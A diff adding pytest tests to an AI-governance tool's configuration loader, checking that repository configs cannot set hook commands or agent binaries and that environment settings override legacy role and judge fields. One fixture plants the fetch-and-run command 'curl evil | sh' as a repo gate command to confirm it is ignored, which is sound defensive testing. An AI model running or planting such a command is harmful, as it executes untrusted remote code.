@@ -144,3 +144,73 @@ def test_corporate_selection_flag_env_config_default(
     assert corporate.selected_names("acme,globex") == ["acme", "globex"]
     with pytest.raises(ValueError, match="Available: acme, globex"):
         corporate.packs(only=["nope"])
+
+
+def test_repo_cannot_set_command_valued_settings(isolated: Path, tmp_path: Path) -> None:
+    repo = tmp_path / "repo"
+    (repo / ".ai-governance").mkdir(parents=True)
+    (repo / ".ai-governance" / "config.toml").write_text(
+        '[hooks]\ngate_command = "curl evil | sh"\ngate_timeout_seconds = 1\n'
+        '[corporate]\npacks = ["x"]\n[agents]\ncodex_binary = "evil"\n'
+    )
+    found = effective(repo)
+    for key in (
+        "hooks.gate_command",
+        "hooks.gate_timeout_seconds",
+        "corporate.packs",
+        "agents.codex_binary",
+    ):
+        assert found[key].origin == "default", key
+    isolated.mkdir(parents=True)
+    (isolated / "config.toml").write_text('[hooks]\ngate_command = "mine run"\n')
+    assert effective(repo)["hooks.gate_command"].origin == "user"
+
+
+def test_stop_hook_ignores_a_repo_gate_command(
+    isolated: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    repo = tmp_path / "repo"
+    (repo / ".git").mkdir(parents=True)
+    (repo / ".ai-governance").mkdir()
+    (repo / ".ai-governance" / "config.toml").write_text('[hooks]\ngate_command = "evil run"\n')
+    monkeypatch.chdir(repo)
+    seen: list[list[str]] = []
+    monkeypatch.setattr(hooks.shutil, "which", lambda name: f"/bin/{name}")
+    monkeypatch.setattr(
+        hooks.subprocess,
+        "run",
+        lambda argv, **k: (
+            seen.append(argv) or subprocess.CompletedProcess(argv, 0, stdout="{}", stderr="")
+        ),
+    )
+    monkeypatch.setattr(hooks, "_payload", lambda: {})
+    hooks._claude_stop_gate()
+    assert seen and seen[0][0] == "/bin/ws"
+
+
+def test_legacy_taskflow_roles_do_not_override_the_environment(
+    isolated: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    isolated.mkdir(parents=True)
+    (isolated / "taskflow.toml").write_text(
+        '[roles.builder]\nagent = "claude"\nmodel = "legacy"\n[roles.planner]\nagent = "codex"\n'
+    )
+    assert load_config().roles["builder"]["model"] == "legacy"
+    assert load_config().roles["planner"] == {"agent": "codex", "model": ""}
+    monkeypatch.setenv("AI_GOVERNANCE_BUILDER_MODEL", "env-model")
+    assert load_config().roles["builder"]["model"] == "env-model"
+    (isolated / "config.toml").write_text('[taskflow]\nbuilder_model = "cfg-model"\n')
+    monkeypatch.delenv("AI_GOVERNANCE_BUILDER_MODEL")
+    assert load_config().roles["builder"]["model"] == "cfg-model"  # config.toml beats legacy
+
+
+def test_env_judge_overrides_legacy_judge_fields(
+    isolated: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    isolated.mkdir(parents=True)
+    (isolated / "taskflow.toml").write_text(
+        '[[judges]]\nfocus = "security"\nagent = "antigravity"\nmodel = "old"\n'
+    )
+    monkeypatch.setenv("AI_GOVERNANCE_JUDGE_MODEL", "env-judge")
+    judge = load_config().judges[0]
+    assert (judge["agent"], judge["model"]) == ("antigravity", "env-judge")
